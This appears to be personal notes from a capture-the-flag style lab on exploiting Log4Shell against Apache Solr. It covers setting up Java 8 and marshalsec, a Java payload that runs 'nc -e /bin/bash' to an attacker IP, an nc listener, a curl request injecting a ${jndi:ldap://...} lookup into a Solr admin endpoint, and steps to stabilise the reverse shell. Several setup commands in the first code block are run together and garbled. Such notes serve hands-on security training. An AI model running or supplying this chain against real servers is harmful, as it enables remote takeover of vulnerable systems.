- Install Java 8
    
    If you are not running 1.8.0_181 within the attack box, you can review the **`update-alternatives --set`** steps below to switch to this Java 8 version.
    
    If you are using your own attacking machine connected to the VPN, you may need to download and install Java 1.8.0_181 with the steps below:
    
    You can find a mirror of different Java versions to run on Linux at this location. [http://mirrors.rootpei.com/jdk/](http://mirrors.rootpei.com/jdk/)
    
    Select the **`jdk-8u181-linux-x64.tar.gz`** package (or alternatively, download the file attached to this task, added for your convenience).
    
    Download this into your attacking machine, and run the following commands to configure your system to use this Java version by default (adjust the download filesystem path as appropriate):
    
    ```
    sudo mkdir /usr/lib/jvmcd /usr/lib/jvmsudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as neededsudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
    sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
    sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
    sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
    sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
    ```
    
    After you have downloaded, extracted, and set the appropriate filesystem settings (the update-alternatives syntax) above, you should be able to run `java -version` and verify you are in fact now running Java 1.8.0_181.
    

Install Maven

- clone marshalsec github
    
    You can download the files with git.
    
    If you do not yet have git, you can install it through your package manager (typically apt on Debian or Ubuntu based Linux distributions):
    
    **`sudo apt install git`**
    
    Clone the repository in any file system location of your choice (I would suggest /tmp or /opt):
    
    **`git clone https://github.com/mbechler/marshalsec`**
    

cd to marsalsec folder

mvn clean package -DskipTests

**`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.IP.ADDRESS:8000/#Exploit"`**

create an exploit file named NAME.java

`public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}`

confirm payload and verify with ls.

**`javac Exploit.java -source 8 -target 8`**

Don't use source or target if on own machine

**`javac Exploit.java`**

run a http server

`python3 -m http.server`

setup listener with same port you specified in your java file.

`nc -lnvp 9999`

LAUNCH THE ATTACK

`curl 'http://VULNERABLE_MACHINE_IP:PORT/solr/admin/cores?foo=$\\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\\}'`

S**tabilise shell**

**`python3 -c "import pty; pty.spawn('/bin/bash')"`**

(press on your keyboard) `Ctrl+Z`

(press on your keyboard) `Enter`

(on your local host) `stty raw -echo`

(on your local host) `fg` (you will not see your keystrokes -- trust yourself and hit **`Enter`**)

(press on your keyboard) `Enter`

(press on your keyboard) `Enter`

(on the reverse shell) `export TERM=xterm`

**Notes:**

If the correct Java is not running you can check this with:

`java -version`

If it's the wrong version you can use:

`sudo update-alternatives —config java`

and then select the version required.
